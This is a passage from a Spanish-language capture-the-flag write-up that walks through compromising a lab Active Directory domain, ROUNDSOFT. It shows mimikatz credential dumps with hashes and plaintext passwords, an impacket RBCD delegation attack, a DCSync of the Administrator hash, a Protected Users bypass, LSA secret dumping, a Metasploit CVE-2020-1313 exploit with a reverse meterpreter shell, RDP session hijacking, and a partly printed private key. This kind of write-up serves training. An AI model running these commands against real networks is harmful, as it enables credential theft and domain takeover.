+Authentication Id : 0 ; 391204 (00000000:0005f824)
+Session           : Interactive from 1
+User Name         : athompson
+Domain            : ROUNDSOFT
+Logon Server      : SHINRA
+Logon Time        : 8/25/2023 6:50:25 PM
+SID               : S-1-5-21-2284550090-1208917427-1204316795-1676
+	msv :
+	 [00000003] Primary
+	 * Username : AThompson
+	 * Domain   : ROUNDSOFT
+	 * NTLM     : 14b1991918cdba8474847c8848a8b656
+	 * SHA1     : 2b416c46d974004d9db7f799792639729cf7c137
+	 * DPAPI    : da282f62633c3e7bdeadb02816ff7be6
+	tspkg :
+	wdigest :
+	 * Username : AThompson
+	 * Domain   : ROUNDSOFT
+	 * Password : (null)
+	kerberos :
+	 * Username : AThompson
+	 * Domain   : ROUNDSOFT.LOCAL
+	 * Password : (null)
+	ssp :
+	credman :
+	 [00000000]
+	 * Username : roundsoft\ruby_adm
+	 * Domain   : gelus
+	 * Password : b3aut1fu1_lyk_@_g3m!
+
+Authentication Id : 0 ; 68684 (00000000:00010c4c)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/25/2023 6:49:40 PM
+SID               : S-1-5-90-0-1
+	msv :
+	 [00000003] Primary
+	 * Username : GELUS$
+	 * Domain   : ROUNDSOFT
+	 * NTLM     : 0bb6f6f24c1afa9ceabc119fed53b9ba
+	 * SHA1     : 332608fd6cb7fdc10af757ae38bf737fb5b8c9a2
+	tspkg :
+	wdigest :
+	 * Username : GELUS$
+	 * Domain   : ROUNDSOFT
+	 * Password : (null)
+	kerberos :
+	 * Username : GELUS$
+	 * Domain   : Roundsoft.local
+	 * Password : 62 c5 38 18 d9 c2 d9 b0 12 30 c0 91 77 5d f3 a1 75 1a 1e d3 a8 e5 b7 b1 5b 83 cb 50 a6 f2 31 19 00 c3 07 6c b3 dc 85 b3 41 3b 8f 16 1b df 74 6d 7e d2 0f d9 4a b2 52 66 4b 54 13 dd 93 dd 15 b3 76 88 62 f3 11 34 8b ea 2c db f2 af 67 d6 67 2f a2 f2 6f 4b 6c 1a 7c ec 1f b7 c2 19 f0 11 d6 98 66 d9 61 23 55 15 2a d7 b5 77 0d 03 18 8a c8 78 1a e7 c8 66 4d d8 c2 1e 36 d7 fb b7 32 ba c6 d4 08 52 be 5a 8e 7d 3b 5c 17 0c 19 f4 83 96 a0 b3 25 8d 43 71 1c 02 80 59 fa df e3 a7 f5 71 bd 53 5d 8d d6 05 0d 7d c7 bc d3 0c 22 f6 bb 67 3f 4b 29 ff 01 52 64 39 a7 d5 41 04 5f 7b 16 31 82 4f 95 50 a7 cd d7 e8 b9 b5 e2 61 28 62 43 81 5d cc 9a 87 95 e2 0e c1 47 7f d7 ef 55 45 e0 22 2f 09 a9 02 23 5e 60 1a 90 68 87 b6 a0 e6 a1 7f a4 0b  
+	ssp :
+	credman :
+
+Authentication Id : 0 ; 93648 (00000000:00016dd0)
+Session           : Batch from 0
+User Name         : repository_admin
+Domain            : ROUNDSOFT
+Logon Server      : SHINRA
+Logon Time        : 8/25/2023 6:49:58 PM
+SID               : S-1-5-21-2284550090-1208917427-1204316795-1110
+	msv :
+	 [00000003] Primary
+	 * Username : repository_admin
+	 * Domain   : ROUNDSOFT
+	 * NTLM     : 61191aeb8b9a60d01e41faa8bacb2334
+	 * SHA1     : fc4b6cb866a39ff10daacc9273f46a68d03dd0c5
+	 * DPAPI    : be550fd796d51b6a89a33bb2f91b8bc2
+	tspkg :
+	wdigest :
+	 * Username : repository_admin
+	 * Domain   : ROUNDSOFT
+	 * Password : (null)
+	kerberos :
+	 * Username : repository_admin
+	 * Domain   : ROUNDSOFT.LOCAL
+	 * Password : (null)
+	ssp :
+	credman :
+
+Authentication Id : 0 ; 422631 (00000000:000672e7)
+Session           : Batch from 0
+User Name         : jops
+Domain            : ROUNDSOFT
+Logon Server      : SHINRA
+Logon Time        : 8/25/2023 6:50:28 PM
+SID               : S-1-5-21-2284550090-1208917427-1204316795-1602
+	msv :
+	 [00000003] Primary
+	 * Username : jops
+	 * Domain   : ROUNDSOFT
+	 * NTLM     : f7b8e6e5af23f06fdbb559d1888261fa
+	 * SHA1     : f96c0dfad6ef2f6c97d1a1076705a0a65b1b10b8
+	 * DPAPI    : 1364f3312f690918fbe42fa9b55adaed
+	tspkg :
+	wdigest :
+	 * Username : jops
+	 * Domain   : ROUNDSOFT
+	 * Password : (null)
+	kerberos :
+	 * Username : jops
+	 * Domain   : ROUNDSOFT.LOCAL
+	 * Password : (null)
+	ssp :
+	credman :
+
+mimikatz(commandline) # exit
+Bye!
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El usuario <code class="language-plaintext highlighter-rouge">jops</code> pertenece al grupo <code class="language-plaintext highlighter-rouge">Operators</code>, este tiene privilegio <code class="language-plaintext highlighter-rouge">GenericWrite</code> sobre el equipo <code class="language-plaintext highlighter-rouge">SHINRA</code> que es el DC por lo que podriamos hacer un ataque <code class="language-plaintext highlighter-rouge">RBCD</code></p>
+<a href="/endgames/rpg/23.png" target="_blank"><div><p><img src="/endgames/rpg/23.png"></p></div></a>
+
+<p class="plain-text">Este tipo de ataque <code class="language-plaintext highlighter-rouge">RBCD</code> se puede hacer facilmente con las herramientas <code class="language-plaintext highlighter-rouge">impacket</code>, creando la cuenta de equipo con <code class="language-plaintext highlighter-rouge">addcomputer</code> y hacer la delegacion con <code class="language-plaintext highlighter-rouge">rbcd</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-addcomputer </span><span class="p">-computer-name attackersystem$ -computer-pass 123456 </span><span class="am">'roundsoft.local/jops'</span><span class="p"> -hashes :f7b8e6e5af23f06fdbb559d1888261fa
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Successfully added machine account attackersystem$ with password 123456.
+
+</span><span class="ve">❯ impacket-rbcd </span><span class="p">-delegate-from attackersystem$ -delegate-to SHINRA$ -action write </span><span class="am">'roundsoft.local/jops'</span><span class="p"> -hashes :f7b8e6e5af23f06fdbb559d1888261fa  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] attackersystem$ can now impersonate users on SHINRA$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     attackersystem$   (S-1-5-21-2284550090-1208917427-1204316795-10101)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al autenticarnos como la maquina intentando obtener un <code class="language-plaintext highlighter-rouge">ticket</code> suplantando a Administrator nos devuelve error aunque si podemos suplantar al equipo <code class="language-plaintext highlighter-rouge">SHINRA$</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-getST </span><span class="p">-spn cifs/shinra.roundsoft.local roundsoft.local/</span><span class="am">'attackersystem$'</span><span class="p">:123456 -impersonate Administrator  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
+[-] Probably SPN is not allowed to delegate by user attackersystem$ or initial TGT not forwardable
+
+</span><span class="ve">❯ impacket-getST </span><span class="p">-spn cifs/shinra.roundsoft.local roundsoft.local/</span><span class="am">'attackersystem$'</span><span class="p">:123456 -impersonate SHINRA$  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting TGT for user
+[*] Impersonating SHINRA$
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in SHINRA$.ccache
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=</span><span class="am">'SHINRA$.ccache'</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Auntenticandonos con el hash del equipo <code class="language-plaintext highlighter-rouge">SHINRA$</code> que es el DC y este tener privilegios <code class="language-plaintext highlighter-rouge">DCSync</code> sobre el dominio podemos dumpear el hash de Administrator</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -k --use-kcache
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\SHINRA$ from ccache
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -k --use-kcache --ntds drsuapi --user Administrator
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\SHINRA$ from ccache 
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ro">[-] </span><span class="p">RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="am">administrator:500:aad3b435b51404eeaad3b435b51404ee:fe29edb1766170b8afe7a55cbf360885:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al intentar autenticarnos con el hash NT de <code class="language-plaintext highlighter-rouge">Administrator</code> a nivel de dominio nos devuelve un error ya que hay una <code class="language-plaintext highlighter-rouge">restriccion</code> en esta cuenta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -u Administrator -H fe29edb1766170b8afe7a55cbf360885
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="sa">[-] </span><span class="p">Roundsoft.local\Administrator:fe29edb1766170b8afe7a55cbf360885 STATUS_ACCOUNT_RESTRICTION</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esto se debe a que el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> pertenece al grupo <code class="language-plaintext highlighter-rouge">Protected Users</code></p>
+<a href="/endgames/rpg/32.png" target="_blank"><div><p><img src="/endgames/rpg/32.png"></p></div></a>
+
+<p class="plain-text">Esta restriccion es facil de bypassear y es que si simplemente agregamos el parametro <code class="language-plaintext highlighter-rouge">-k</code> para autenticarnos por kerberos donde no aplica, devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -u Administrator -H fe29edb1766170b8afe7a55cbf360885 -k
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\Administrator:fe29edb1766170b8afe7a55cbf360885 </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos conectarnos con <code class="language-plaintext highlighter-rouge">wmiexec</code> y obtener una shell donde leemos la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-wmiexec </span><span class="p">roundsoft.local/Administrator@shinra.roundsoft.local -hashes :fe29edb1766170b8afe7a55cbf360885 -k -shell-type powershell  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> </span><span class="am">whoami</span><span class="p">
+roundsoft\administrator
+
+PS C:\> </span><span class="am">hostname</span><span class="p">
+Shinra
+
+PS C:\> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\flag.txt
+RPG{WhY_w0rK_h@rD_Wh3N_U_c@N_d3l3g@7e?}
+
+PS C:\></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque si dumpeamos los secretos <code class="language-plaintext highlighter-rouge">lsa</code> con <code class="language-plaintext highlighter-rouge">crackmapexec</code> encontramos la contraseña del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> en texto plano y podemos conectarnos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -u Administrator -H fe29edb1766170b8afe7a55cbf360885 -k --lsa
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\Administrator:fe29edb1766170b8afe7a55cbf360885 </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Dumping LSA secrets
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="am">ROUNDSOFT\SHINRA$:aes256-cts-hmac-sha1-96:beadb3a924678aa10bcb93c380e61e8f6ffdb856053b43124dc91c87fd10fc83
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="am">ROUNDSOFT\SHINRA$:aes128-cts-hmac-sha1-96:4f79bd07a999d2c9dad54d92c1b1e0e4
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="am">ROUNDSOFT\SHINRA$:des-cbc-md5:da54bc386bdc34f1
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="am">ROUNDSOFT\SHINRA$:plain_password_hex:7525fd02c56f75333058d0fff13f02f73b1d08b7864f6c966b0721cce5cdcadf90080fb560b3a675726d9dc43b21846d2a6fd02692ac94250e0b82257664b66c72ab06e93b7476143529e6947ce60fb1db4448d0c4f76517688d1902ec7e81f1fe741aaa9ba1eba5e3cec86523bf4057aa04525ddeb40dcd8a66429791962af93dd9dc5af7d44eb446df8755d16b8ee62ef88da153ae7d02d0b98defeae6154d0b346a157c39fca5a198b74ec45174286002f44a8705de6f93113b8a63ae8d02f11033c2877cbebf6a9d86eb0602cba6665e5a6344af9588908d45244ee303ece614118e5077cb2720f9703e5a07954f  
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="am">ROUNDSOFT\SHINRA$:aad3b435b51404eeaad3b435b51404ee:40a874865912cdcfad83663885215c6b:::
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="am">ROUNDSOFT\Administrator:SimianThrash_xiv14
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="am">dpapi_machinekey:0x3adf746c69f4e53c29d7a39f3b862599f16320a9
+</span><span class="am">dpapi_userkey:0x519512fd1017c0b60f9b7f9a454342f441896971
+</span><span class="az">SMB         </span><span class="p">roundsoft.local 445    SHINRA           </span><span class="am">NL$KM:d8337f7ba32cde15cfb49a10373f6ba94e4946705727e81ee8a911a81def190ccc4392f39cc7511a06566d60da73227481ecb49f69fc6a8ac852e6f503560d59
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb shinra.roundsoft.local -u Administrator -p SimianThrash_xiv14 -k
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)
+</span><span class="az">SMB         </span><span class="p">shinra.roundsoft.local 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\Administrator:SimianThrash_xiv14 </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-wmiexec </span><span class="p">roundsoft.local/Administrator:SimianThrash_xiv14@shinra.roundsoft.local -k -shell-type powershell  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> </span><span class="am">whoami</span><span class="p">
+roundsoft\administrator
+
+PS C:\> </span><span class="am">hostname</span><span class="p">
+Shinra
+
+PS C:\> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\flag.txt
+RPG{WhY_w0rK_h@rD_Wh3N_U_c@N_d3l3g@7e?}
+
+PS C:\></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para eliminar la <code class="language-plaintext highlighter-rouge">restriccion</code> de <code class="language-plaintext highlighter-rouge">smb</code> basta con eliminar al usuario <code class="language-plaintext highlighter-rouge">Administrator</code> del grupo global <code class="language-plaintext highlighter-rouge">Protected Users</code> haciendo uso del comando <code class="language-plaintext highlighter-rouge">net group /del</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\> </span><span class="am">net </span><span class="p">group </span><span class="az">"Protected Users" </span><span class="p">Administrator /del  
+The command completed successfully.
+
+PS C:\></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora nos autenticamos a nivel de <code class="language-plaintext highlighter-rouge">smb</code> normalmente hacia todos los equipos del <code class="language-plaintext highlighter-rouge">dominio</code>, las credenciales son <code class="language-plaintext highlighter-rouge">validas</code> y hemos comprometido todos los <code class="language-plaintext highlighter-rouge">equipos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 192.168.125.88-129 -u Administrator -p SimianThrash_xiv14
+</span><span class="az">SMB         </span><span class="p">192.168.125.88  445    GELUS            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:GELUS) (domain:Roundsoft.local) (signing:False) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">192.168.125.128 445    SHINRA           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">192.168.125.129 445    LUX              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 18362 x64 (name:LUX) (domain:Roundsoft.local) (signing:False) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">192.168.125.88  445    GELUS            </span><span class="ve">[+] </span><span class="p">Roundsoft.local\Administrator:SimianThrash_xiv14 </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">192.168.125.128 445    SHINRA           </span><span class="ve">[+] </span><span class="p">Roundsoft.local\Administrator:SimianThrash_xiv14 </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">192.168.125.129 445    LUX              </span><span class="ve">[+] </span><span class="p">Roundsoft.local\Administrator:SimianThrash_xiv14 </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> a <code class="language-plaintext highlighter-rouge">SHINRA</code> y leer la ultima <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i shinra.roundsoft.local -u Administrator -p SimianThrash_xiv14  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+roundsoft\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\flag.txt
+RPG{WhY_w0rK_h@rD_Wh3N_U_c@N_d3l3g@7e?}
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra1">
+<br><h3 class="post-title">Extra 1</h3>
+<h4 class="post-title">CVE-2020-1313 - LUX Administrator / IGNIS root</h4><br>
+
+<p class="plain-text">Desde la sesión de <code class="language-plaintext highlighter-rouge">meterpreter</code> como <code class="language-plaintext highlighter-rouge">janderson</code> vemos varios posibles exploits, entre ellos el <code class="language-plaintext highlighter-rouge">cve_2020_1313</code> que podemos ejecutar indicando la sesion y host</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Users\janderson\Documents) > background
+</span><span class="az">[*] </span><span class="p">Backgrounding session 1...
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> use exploit/windows/local/cve_2020_1313_system_orchestrator  
+</span><span class="az">[*] </span><span class="p">No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) exploit(</span><span class="ro">windows/local/cve_2020_1313_system_orchestrator</span><span class="p">) >> set session 1
+session => 1
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) exploit(</span><span class="ro">windows/local/cve_2020_1313_system_orchestrator</span><span class="p">) >> set lhost 192.168.125.135
+lhost => 192.168.125.135
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) exploit(</span><span class="ro">windows/local/cve_2020_1313_system_orchestrator</span><span class="p">) >> set lport 4444
+lport => 4444
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) exploit(</span><span class="ro">windows/local/cve_2020_1313_system_orchestrator</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">Running automatic check ("set AutoCheck false" to disable)
+</span><span class="ve">[+] </span><span class="p">The target appears to be vulnerable.
+</span><span class="az">[*] </span><span class="p">Attempting to PrivEsc on LUX via session ID: 1
+</span><span class="az">[*] </span><span class="p">Exploit uploaded on LUX to C:\Users\JANDER~1\AppData\Local\Temp\TlLjChoI.exe
+</span><span class="az">[*] </span><span class="p">Payload (7168 bytes) uploaded on LUX to C:\Users\JANDER~1\AppData\Local\Temp\ryfUGQwAG.exe
+</span><span class="am">[!] </span><span class="p">This exploit requires manual cleanup of the payload C:\Users\JANDER~1\AppData\Local\Temp\ryfUGQwAG.exe
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:1) exploit(</span><span class="ro">windows/local/cve_2020_1313_system_orchestrator</span><span class="p">) >></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo este exploit no es inmediato, puede tardar desde un par de minutos hasta <code class="language-plaintext highlighter-rouge">horas</code> y no puedes hacer nada para acelerarlo, despues de un tiempo recibimos una sesion de <code class="language-plaintext highlighter-rouge">meterpreter</code> como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az">[*] </span><span class="p">Sending stage (175686 bytes) to 10.10.14.10
+</span><span class="az">[*] </span><span class="p">Meterpreter session 5 opened (10.10.14.10:4444 -> 10.10.14.10:35826) 
+
+(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\Windows\system32) > getuid
+Server username: NT AUTHORITY\SYSTEM
+(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\Windows\system32) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque podemos dumpear la sam con <code class="language-plaintext highlighter-rouge">hashdump</code> para mas comodidad cambiamos la contraseña del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> por una sencilla como lo es <code class="language-plaintext highlighter-rouge">password123#</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\Windows\system32) > shell
+Process 20180 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.18362.836]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32></span><span class="am">net </span><span class="p">user Administrator password123#
+The command completed successfully.
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya con la contraseña de <code class="language-plaintext highlighter-rouge">Administrator</code> podemos habilitar <code class="language-plaintext highlighter-rouge">RDP</code> y el modo de administracion restringido para despues poder conectarnos con <code class="language-plaintext highlighter-rouge">xfreerdp</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb lux.roundsoft.local -u Administrator -p password123# --local-auth -M rdp -o ACTION=enable
+</span><span class="az">SMB         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 18362 x64 (name:LUX) (domain:LUX) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="ve">[+] </span><span class="p">LUX\Administrator:password123# </span><span class="am">(Pwn3d!)
+</span><span class="az">RDP         </span><span class="p">lux.roundsoft.local 445    LUX              </span><span class="ve">[+] </span><span class="p">RDP enabled successfully</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">New-ItemProperty </span><span class="c1">-Path </span><span class="az">"HKLM:\System\CurrentControlSet\Control\LSA" </span><span class="c1">-Name </span><span class="p">DisableRestrictAdmin </span><span class="c1">-Value </span><span class="p">0 </span><span class="c1">-PropertyType </span><span class="p">DWORD  
+
+DisableRestrictAdmin : 0
+PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
+PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\system\currentcontrolset\control
+PSChildName          : lsa
+PSDrive              : HKLM
+PSProvider           : Microsoft.PowerShell.Core\Registry
+
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos con <code class="language-plaintext highlighter-rouge">xfreerdp</code> y obtenemos una sesion con interfaz grafica en <code class="language-plaintext highlighter-rouge">LUX</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ xfreerdp </span><span class="p">/u:Administrator /p:password123# /v:lux.roundsoft.local /cert:ignore /dynamic-resolution  </span>
+</code></pre></div></div><br>
+
+<a href="/endgames/rpg/24.png" target="_blank"><div><p><img src="/endgames/rpg/24.png"></p></div></a>
+
+<p class="plain-text">Desde el administrador de tareas encontramos una sesion rdp como <code class="language-plaintext highlighter-rouge">janderson</code> la cual esta desconectada pero nos podemos conectar a ella con <code class="language-plaintext highlighter-rouge">Connect</code></p>
+<a href="/endgames/rpg/25.png" target="_blank"><div><p><img src="/endgames/rpg/25.png"></p></div></a>
+
+<p class="plain-text">En la sesion de <code class="language-plaintext highlighter-rouge">janderson</code> encomtramos una consola de <code class="language-plaintext highlighter-rouge">putty</code> con una sesion <code class="language-plaintext highlighter-rouge">ssh</code> abierta en el equipo ignis como <code class="language-plaintext highlighter-rouge">root</code>, podemos interactuar y leer la <code class="language-plaintext highlighter-rouge">id_rsa</code></p>
+<a href="/endgames/rpg/26.png" target="_blank"><div><p><img src="/endgames/rpg/26.png"></p></div></a>
+
+<a href="/endgames/rpg/27.png" target="_blank"><div><p><img src="/endgames/rpg/27.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># cat flag.txt 
+RPG{h1j@ckin_lyk_@_pir@t3}
+</span><span class="ve">root@Ignis</span><span class="p">:</span><span class="az">~</span><span class="p"># cat .ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApMsl55Pd3zSo30FA1lXAK438V4LGFv+CKORjEFtQWn1kN/uT
+6j8c5kf/gAeAZvBb4GBR/vtQ9MKigTrFa+0Z4Azp/SXe/tx0IKHq2xG7NcL4zUWP
+PtL7Kz/Y0JDrXgCyJMgzeyDeebN4UkC24cGG55efgY8QOFq+htHnPJmZGDwSVWvX
